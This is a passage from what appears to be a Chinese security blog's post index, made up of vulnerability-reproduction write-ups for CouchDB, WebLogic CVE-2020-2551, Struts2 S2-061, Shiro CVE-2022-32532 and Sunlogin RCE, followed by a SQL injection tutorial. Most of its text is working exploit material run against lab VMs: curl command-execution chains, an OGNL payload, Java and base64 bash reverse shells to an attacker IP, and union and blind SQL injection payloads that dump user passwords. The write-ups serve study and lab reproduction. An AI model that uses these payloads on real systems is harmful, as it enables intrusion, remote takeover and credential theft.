&#39;http://GhostToKnow:GhostToKnow@192.168.52.128:5984/ccc/test&#39; -d &#39;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#39; Couchdb 2.x删除了_temp_view，所以我们为了触发query_servers中定义的命令，需要添加一个_view： curl -X PUT http://GhostToKnow:GhostToKnow@192.168.52.128:5984/ccc/_design/test -d &#39;&#123;&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:&#123;&quot;wooyun&quot;:&#123;&quot;map&quot;:&quot;&quot;&#125; &#125;,&quot;language&quot;:&quot;cmd&quot;&#125;&#39; -H &quot;Content-Type: application/json&quot; 增加_view的同时即触发了query_servers中的命令。 看到返回错误信息没有关系，报错来源于执行命令之后的流程 加入靶机的docker查看发现命令执行成功，成功写入success文件 1.6.0系列 curl -X PUT &#39;http://GhostToKnow:GhostToKnow@192.168.52.128:5984/_config/query_servers/cmd&#39; -d &#39;&quot;id &gt;/tmp/success&quot;&#39; curl -X PUT &#39;http://GhostToKnow:GhostToKnow@192.168.52.128:5984/ccc&#39; curl -X PUT &#39;http://GhostToKnow:GhostToKnow@192.168.52.128:5984/ccc/test&#39; -d &#39;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#39; curl -X POST &#39;http://GhostToKnow:GhostToKnow@192.168.52.128:5984/ccc/_temp_view?limit=10&#39; -d &#39;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#39; -H &#39;Content-Type:application/json&#39; exp要替换对应的网址，端口，监听ip，对应版本，1.x和2.x的payload不一致。 python3 exp.py","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"CouchDB","slug":"CouchDB","permalink":"http://example.com/tags/CouchDB/"}]},{"title":"Weblogic CVE-2020-2551","slug":"Weblogic-CVE-2020-2551","date":"2023-04-02T12:10:38.000Z","updated":"2023-04-02T13:14:33.688Z","comments":true,"path":"2023/04/02/Weblogic-CVE-2020-2551/","link":"","permalink":"http://example.com/2023/04/02/Weblogic-CVE-2020-2551/","excerpt":"","text":"前言2020年1月15日,Oracle发布了一系列的安全补丁,其中Oracle WebLogic Server产品有高危漏洞,漏洞编号CVE-2020-2551,CVSS评分9.8分,漏洞利用难度低,可基于IIOP协议执行远程代码。 经过分析这次漏洞主要原因是错误的过滤JtaTransactionManager类，JtaTransactionManager父类AbstractPlatformTransactionManager在之前的补丁里面就加入到黑名单列表了,T3协议使用的是resolveClass方法去过滤的,resolveClass方法是会读取父类的,所以T3协议这样过滤是没问题的。但是IIOP协议这块,虽然也是使用的这个黑名单列表,但不是使用resolveClass方法去判断的,这样默认只会判断本类的类名,而JtaTransactionManager类是不在黑名单列表里面的,它的父类才在黑名单列表里面,这样就可以反序列化JtaTransactionManager类了,而JtaTransactionManager类是存在jndi注入的。 环境搭建直接使用vulhub中的CVE-2017-10271就可以 使用git克隆到本地 1git clone https://github.com/vulhub/vulhub.git 进入对应环境 1cd vulhub/weblogic/CVE-2017-10271 启动docker漏洞环境 1sudo docker-compose up -d 搭建完成以后，访问7001&#x2F;console如下图所示即为搭建成功 检测是否存在漏洞python3 CVE-2020-2551.py -u http://192.168.52.128:7001/ 发现存在漏洞 漏洞利用攻击机ip：192.168.0.101 靶机ip：192.168.52.128 攻击机开启监听nc -lvnp 3333 编写一个exp.java文件： 12345678910111213import java.io.IOException;public class exp &#123; static&#123; try &#123; java.lang.Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;nc -e /bin/bash 192.168.0.101 3333&quot;&#125;); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; public static void main(String[] args) &#123; &#125;&#125; 其中”nc -e &#x2F;bin&#x2F;bash 192.168.52.130 3333”是要执行的命令 然后进行编译，生成出一个exp.class文件 启一个web服务，需要与exp.class在同一文件夹 使用marshalsec起一个恶意的RMI服务 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.0.101/#exp&quot; 1099 然后开始进行攻击，使用命令,成功弹出shell： 1java -jar weblogic_CVE_2020_2551.jar 192.168.52.128 7001 rmi://192.168.0.101:1099/exp","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"Weblogic","slug":"Weblogic","permalink":"http://example.com/tags/Weblogic/"}]},{"title":"Struts2 S2-061 远程命令执行漏洞（CVE-2020-17530）复现","slug":"Struts2-S2-061-远程命令执行漏洞（CVE-2020-17530）复现","date":"2023-03-29T13:21:36.000Z","updated":"2023-03-29T13:32:08.442Z","comments":true,"path":"2023/03/29/Struts2-S2-061-远程命令执行漏洞（CVE-2020-17530）复现/","link":"","permalink":"http://example.com/2023/03/29/Struts2-S2-061-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-17530%EF%BC%89%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"前言Apache Struts2框架是一个用于开发Java EE网络应用程序的Web框架。Apache Struts于2020年12月08日披露 S2-061 Struts 远程代码执行漏洞(CVE-2020-17530)，在使用某些tag等情况下可能存在OGNL表达式注入漏洞，从而造成远程代码执行，风险极大，S2-061是对S2-059漏洞修复后的绕过。 影响版本： Apache Struts 2.0.0 - 2.5.25 环境搭建这里使用vulhub漏洞环境搭建 使用git克隆到本地 git clone https://github.com/vulhub/vulhub.git 进入对应环境 cd vulhub/struts2/s2-061 启动docker漏洞环境 sudo docker-compose up -d 访问对应地址，出现如下页面，环境搭建成功 复现过程实现判断下是否存在漏洞，使用?id&#x3D;%25{7*7}查看返回id的值是7*7还是49，如果是47那么就说明进行了二次表达式解析，存在改漏洞 这里id为49说明存在该漏洞。抓包修改为以下，这里的#arglist.add(&quot;xx&quot;)函数这里包含的值是你要执行的命令 123456789101112131415161718POST /.action HTTP/1.1Host: 192.168.52.128:8080User-Agent: xxxAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: JSESSIONID=node0i3sptalo62q6kw46qu49oxwn1.node0Upgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwFContent-Length: 833------WebKitFormBoundaryl7d1B1aGsV2wcZwFContent-Disposition: form-data; name=&quot;id&quot;%&#123;(#instancemanager=#application[&quot;org.apache.tomcat.InstanceManager&quot;]).(#stack=#attr[&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;]).(#bean=#instancemanager.newInstance(&quot;org.apache.commons.collections.BeanMap&quot;)).(#bean.setBean(#stack)).(#context=#bean.get(&quot;context&quot;)).(#bean.setBean(#context)).(#macc=#bean.get(&quot;memberAccess&quot;)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(&quot;java.util.HashSet&quot;)).(#bean.put(&quot;excludedClasses&quot;,#emptyset)).(#bean.put(&quot;excludedPackageNames&quot;,#emptyset)).(#arglist=#instancemanager.newInstance(&quot;java.util.ArrayList&quot;)).(#arglist.add(&quot;ls&quot;)).(#execute=#instancemanager.newInstance(&quot;freemarker.template.utility.Execute&quot;)).(#execute.exec(#arglist))&#125;------WebKitFormBoundaryl7d1B1aGsV2wcZwF-- 已经可以执行我们的命令了，接下来反弹shell 在vps上监听3333端口：nc -lvnp 3333 编写反弹shell代码 bash -i &gt;&amp; /dev/tcp/192.168.52.130/3333 0&gt;&amp;1 反弹shell涉及到管道符问题要将命令进行base64编码 bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUyLjEzMC8zMzMzIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125; 成功反弹出shell 检查POC 1234567891011121314151617181920212223242526272829303132333435import requestsimport argparseimport osdef url(): parser = argparse.ArgumentParser(description=&#x27;S2-061 CVE-2020-17530&#x27;) parser.add_argument(&#x27;target_url&#x27;,type=str,help=&#x27;The target address,example: http://192.168.52.128:8080&#x27;) args = parser.parse_args() global url url = args.target_url if url.startswith(&#x27;http://&#x27;) or url.startswith(&#x27;https://&#x27;): pass else: print(&#x27;请使用http://或者https://&#x27;) os._exit(0) if url.endswith(&#x27;/&#x27;): url = url[:-1] print(&quot;开始测试&quot;) return urldef poc(): headers=&#123; &#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100102 Firefox/107.0&#x27; &#125; vul_url = url + &#x27;/?id=%25&#123;7*7&#125;&#x27; try: text = requests.get(vul_url,headers=headers,timeout=10).text if &#x27;49&#x27; in text: print(&#x27;[漏洞存在]&#x27;) else: print(&#x27;[漏洞不存在]&#x27;) except: print(&#x27;[发生错误]&#x27;)if __name__ == &#x27;__main__&#x27;: url() poc() 修复建议升级到 Struts 2.5.26 版本或更高版本","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"Struts2","slug":"Struts2","permalink":"http://example.com/tags/Struts2/"}]},{"title":"Shiro 身份认证绕过漏洞 CVE-2022-32532","slug":"Shiro-身份认证绕过漏洞-CVE-2022-32532","date":"2023-03-29T13:16:44.000Z","updated":"2023-03-29T13:19:53.225Z","comments":true,"path":"2023/03/29/Shiro-身份认证绕过漏洞-CVE-2022-32532/","link":"","permalink":"http://example.com/2023/03/29/Shiro-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2022-32532/","excerpt":"","text":"前言123Apache Shiro 是一个强大且易用的 Java 安全框架，通过它可以执行身份验证、授权、密码和会话管理。使用 Shiro 的易用 API，您可以快速、轻松地保护任何应用程序 —— 从最小的移动应用程序到最大的 WEB 和企业应用程序。2022年6月29日，Apache官方披露Apache Shiro权限绕过漏洞(CVE-2022-32532)，当Apache Shiro中使用RegexRequestMatcher进行权限配置，且正则表达式中携带&quot;.&quot;时，未经授权的远程攻击者可通过构造恶意数据包绕过身份认证，导致配置的权限验证失效。 影响版本Apache Shiro &lt; 1.9.1 漏洞原理123根据java正则表达式的特点，在正则表达式中元字符.是匹配除换行符之外的任何单个字符。新增Pattern.DOTALL模式后，正则表达式.就可以匹配任何字符包括换行符。在shiro-core-1.9.0.jar中存在一个RegExPatternMatcher类，提供请求路径匹配功能及拦截器参数解析的功能。这个类的Pattern存在带.的正则表达式匹配，如果存在/n或/r字符时，就会判断错误。 环境搭建直接使用vulfocus的镜像环境 启动靶场后直接访问给的地址就行 复现过程测试直接访问敏感地址访问被拒绝 我们抓一下get包，放在Repeater模块 使用%0a进行权限绕过%0a是换行符 访问成功返回success 修复建议建议尽快升级至Apache Shiro 1.9.1及以上版本","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"Shiro","slug":"Shiro","permalink":"http://example.com/tags/Shiro/"}]},{"title":"CNVD-2022-10270/03672 向日葵RCE复现","slug":"CNVD-2022-10270-03672-向日葵RCE复现","date":"2023-03-29T13:05:36.000Z","updated":"2023-03-29T13:20:12.997Z","comments":true,"path":"2023/03/29/CNVD-2022-10270-03672-向日葵RCE复现/","link":"","permalink":"http://example.com/2023/03/29/CNVD-2022-10270-03672-%E5%90%91%E6%97%A5%E8%91%B5RCE%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"前言向日葵是一款免费的集远程控制电脑手机、远程桌面连接、远程开机、远程管理、支持内网穿透的一体化远程控制管理工具软件。 于2022年2月5日和2022年2月15日，CNVD公开上海贝锐信息科技股份有限公司的向日葵远控软件存在远程代码执行漏洞（CNVD-2022-10270&#x2F;CNVD-2022-03672），影响Windows系统使用的个人版和简约版，攻击者可利用该漏洞获取服务器控制权。 影响版本12向日葵个人版 for Windows &lt;= 11.0.0.33向日葵简约版 &lt;= V1.0.1.43315（2021.12） 漏洞级别高危 环境搭建在虚拟机里安装11.0.0.33的低版本向日葵 漏洞复现使用nmap或其他工具探测目标端口 在浏览器中访问ip+端口号+cgi-bin&#x2F;rpc?action&#x3D;verify-haras （端口号：每一个都尝试，直到获取到session值CID） Cookies添加拿到的CID后加上payload请求 http://192.168.52.133:49437/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+ whoami 手动复现完成 工具使用使用工具自带的扫描 xrkRce.exe -h ip -t scan 测试命令执行 批量检测python3 sunlogin-fuzz.py -t 192.168.52.128/25","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"向日葵","slug":"向日葵","permalink":"http://example.com/tags/%E5%90%91%E6%97%A5%E8%91%B5/"}]},{"title":"常见sql注入手法总结与技巧(一)","slug":"常见sql注入手法总结与技巧-一","date":"2023-03-24T11:48:48.000Z","updated":"2023-03-29T13:20:40.806Z","comments":true,"path":"2023/03/24/常见sql注入手法总结与技巧-一/","link":"","permalink":"http://example.com/2023/03/24/%E5%B8%B8%E8%A7%81sql%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93%E4%B8%8E%E6%8A%80%E5%B7%A7-%E4%B8%80/","excerpt":"","text":"前言SQL 是 Structured Query Language 的缩写，中文译为“结构化查询语言”。SQL 是一种计算机语言，用来存储、检索和修改关系型数据库中存储的数据。 sql注入是最为常见也是破坏力很大的漏洞，它是因为开发在开发时没有对用户的输入行为进行判断和过滤，使得用户输入了恶意语句后传给了后端数据库进行相应的动作（如增删改查甚至写后门）。 根本产生原因：后端服务器接收传来的参数未经过严格过滤判断而直接进入数据库查询 所以在学习SQL注入前需要了解SQL基础语法 SQL注入根源分析如果后台sql语句为： 1$sql=&quot;SELECT * FROM users WHERE id=&#x27; $id &#x27; LIMIT 0,1&quot;; 如果我们传入id&#x3D;1’ 那么如果后端没有经过过滤而是直接把我们传入的参数带进sql语句中，那么sql语句就会变成： 1$sql=&quot;SELECT * FROM users WHERE id=&#x27;1&#x27;&#x27; LIMIT 0,1&quot;; 我们传入的 ‘ 就会一块带入和前面的单引号进行闭合，导致原来后面的单引号就多余，而sql语句引号是必须成对出现的就会报错什么都查不出来，但如果我们在1’后面加入恶意语句并且把后面的原来的语句进行注解，就会造成sql语句会执行我们传入的恶意语句，实现注入。 12id = -1&#x27; union select database() #$sql=&quot;SELECT * FROM users WHERE id=&#x27;-1&#x27; union select database() #&#x27; LIMIT 0,1&quot;; -1表示查询一个不存在的id，是为了不影响后面我们的注入语句 #,–+,– 表示注释，把后面所有语句注释掉，这样就不会影响我们的注入语句 sql参数类型分类SQL注入按照参数类型分类可分为两种：数字型和字符型 数字型：select * from table where id&#x3D;2 字符型：select * from table where id&#x3D;’2’ 区别在于数字型不需要单引号进行闭合，而字符型一般需要通过单引号闭合。 判断类型方法： ​ 构造payload为：id=1 order by 9999 --+ 如果正确返回页面，则为字符型；否则，为数字型 ​ 构造payload为：1 and 1=2 如果正确返回页面，则为字符型；否则，为数字型 常见sql注入手法这里先给出常用的payload，后面会使用到 1234567select database()select group_concat(table_name)from information_schema.tables where table_schema=database()select group_concat(column_name)from information_schema.columns where table_name=&#x27;xxxx&#x27;select group_concat(字段名) from 表名 常见注入手法分类布尔盲注 时间盲注 union联合注入 报错注入 堆叠注入 二次注入 宽字节注入 通过sql注入写webshell 通过http header注入 … 盲注通常根据SQL注入是否有回显将其分为有回显的注入和无回显的注入，其中无回显的注入就是盲注。 我们的注入语句可能会让网页呈现两种状态，例如“查询成功”，“查询失败”，相当于true和false。也可能是一句“查询完成”或者什么都不说。虽然并不能直接得到数据库中的具体数据，但是SQL语句的拼接已经发生了，非法的SQL也执行了，SQL注入攻击就发生了，只是SQL注入的结果不能直接拿到。 盲注就是针对这种无回显的情况，盲注就像是爆破，在进行SQL盲注时，大致过程为： 12345678如果&quot;数据库XX&quot;的第一个字母是a，就返回“查询成功”，否则返回“查询失败”如果&quot;数据库XX&quot;的第一个字母是b，就返回“查询成功”，否则返回“查询失败”如果&quot;数据库XX&quot;的第一个字母是c，就返回“查询成功”，否则返回“查询失败”...如果&quot;数据库XX&quot;的第二个字母是a，就返回“查询成功”，否则返回“查询失败”如果&quot;数据库XX&quot;的第二个字母是b，就返回“查询成功”，否则返回“查询失败”如果&quot;数据库XX&quot;的第二个字母是c，就返回“查询成功”，否则返回“查询失败”... 通过这样不断的测试爆破，根据回显的“查询成功”和“查询失败”，判断出具体数据的每一位是什么，就可以完整的得到这个数据的具体值了。 布尔盲注下面使用sqli-labs靶场演示,less-8关 查询成功返回You are in…. 而查询失败则什么都不显示 返回You are in….相当于是“查询成功”，而什么都没显示则相当于是“查询失败”。所以我们构造的判断语句，可以根据页面是否有You are in….来充当判断条件。 要使用的sql函数： substr(要截取的字符串，从哪一位开始截取，截取多长) ascii()返回传入字符串的首字母的ASCII码 获取当前数据库名 12345678910111213141.判断当前数据库名的长度id=1&#x27; and length(database())=8 --+ //有回显判断到等于8时出现You are in....说明语句执行正确，当前数据库长度为8个字符2.判断当前数据库名//判断数据库的第一个字符id=1&#x27; and ascii(substr(database(),1,1))=115 --+//判断数据库的第二个字符id=1&#x27; and ascii(substr(database(),2,1))=101 --+//判断数据库的第三个字符id=1&#x27; and ascii(substr(database(),3,1))=99 --+...数据库为 security 获取当前库的表名 123456789判断每个表名的每个字符的ascii值//判断第一个表的第一个字符id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+//判断第一个表的第二个字符id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109 --+...判断出存在表 emails、referers、uagents、users 获取表的字段 123456789猜测users表比较重要，先查询users表//判断第一个字段的第一个字符id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))=117 --+//判断第一个字段的第二个字符id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),2,1))=115 --+...users表中存在 id、username、password 字段 获取字段中的数据 12345//判断id字段的第一行数据的第一个字符id=1&#x27; and ascii(substr((select id from users limit 0,1),1,1))=100 --+//判断id字段的第二行数据的第二个字符id=1&#x27; and ascii(substr((select id from users limit 0,1),2,1))=100 --+... 手工去盲注太过繁琐，不建议手工注入，可借助工具或者写脚本跑 时间盲注时间盲注也叫延迟注入。在页面没有回显数据，也没有可以充当判断条件的地方，也没有报错信息，就可以考虑尝试时间盲注。时间盲注就是将页面的反响时间作为判断依据，来注入出数据库的信息。 以Less-9为例，当我们以id&#x3D;1’ and sleep(5) –+ 进行注入，可以明显的感觉到页面返回响应的时间变长了，大概拉长了5秒左右，这说明构造的sleep(5)语句起作用了。我们可以把这个当作判断依据，配合if语句使用。 if(a,b,c) 如果a的值为true，则返回b的值，如果a的值为false，则返回c的值。 获取数据库名 123456//查询数据库名第一个字符id=1&#x27; and if(ascii(substr(database(),1,1))= 115,sleep(5),0) --+明显感受到页面延迟了几秒，说明数据库名字第一个字符是s。//查询数据库名第二个字符id=1&#x27; and if(ascii(substr(database(),2,1))= 101,sleep(5),0) --+... 与盲注类似，后面就是爆破字符，再爆表名，字段名，具体数据。 不建议手注，建议编写脚本或使用工具 union联合注入第一步，测试注入点，一些小技巧：利用引号，and 1&#x3D;1 ，or 1&#x3D;1 等判断是字符型还是数字型 正常返回判断是字符型 第二步，利用order by 查表得到到字段个数 查到3时正常返回但到4时报错说明当前表中只有三列 第三步，利用union select 1,2,3..判断回显位，如果有回显，找到回显位，回显位也就是回显页面有我们设置的1,2,3的位置 发现者里有2和3的回显位,在name和Password回显 第四步，爆库，爆表，爆字段名，爆值 为什么用-1 ：因为-1大概率会返回空表，union select联合查询会返回一张表，就只会显示后面联合查询表 组合使用上面提到的常用的payload，放在页面回显位上 -1&#39; union select 1,(select database()),3 --+ -1&#39; union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=database()),3 --+ 爆出4个表，选择爆users表 -1&#39; union select 1,(select group_concat(column_name)from information_schema.columns where table_name=&#39;users&#39;),3 --+ 发现查询出了很多字段应该爆错了不是我们需要的那个表，可能其他库里也有users表，这样要加一条限制语句，查security库里的users表 -1&#39; union select 1,(select group_concat(column_name)from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),3 --+ 爆字段的数据 -1&#39; union select 1,(select group_concat(id,username,password) from users),3 --+ 12345-1&#x27; union select 1,(select database()),3 --+-1&#x27; union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=database()),3 --+-1&#x27; union select 1,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;users&#x27;),3 --+-1&#x27; union select 1,(select group_concat(column_name)from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),3 --+-1&#x27; union select 1,(select group_concat(id,username,password) from users),3 --+","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"SQL注入,安全基础","slug":"SQL注入-安全基础","permalink":"http://example.com/tags/SQL%E6%B3%A8%E5%85%A5-%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"}]}],"categories":[{"name":"java安全","slug":"java安全","permalink":"http://example.com/categories/java%E5%AE%89%E5%85%A8/"},{"name":"取证","slug":"取证","permalink":"http://example.com/categories/%E5%8F%96%E8%AF%81/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/categories/PHP/"},{"name":"POC","slug":"POC","permalink":"http://example.com/categories/POC/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"volatility","slug":"volatility","permalink":"http://example.com/tags/volatility/"},{"name":"PHP代码审计","slug":"PHP代码审计","permalink":"http://example.com/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"Joomla","slug":"Joomla","permalink":"http://example.com/tags/Joomla/"},{"name":"Tomcat","slug":"Tomcat","permalink":"http://example.com/tags/Tomcat/"},{"name":"CouchDB","slug":"CouchDB","permalink":"http://example.com/tags/CouchDB/"},{"name":"Weblogic","slug":"Weblogic","permalink":"http://example.com/tags/Weblogic/"},{"name":"Struts2","slug":"Struts2","permalink":"http://example.com/tags/Struts2/"},{"name":"Shiro","slug":"Shiro","permalink":"http://example.com/tags/Shiro/"},{"name":"向日葵","slug":"向日葵","permalink":"http://example.com/tags/%E5%90%91%E6%97%A5%E8%91%B5/"},{"name":"SQL注入,安全基础","slug":"SQL注入-安全基础","permalink":"http://example.com/tags/SQL%E6%B3%A8%E5%85%A5-%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"}]}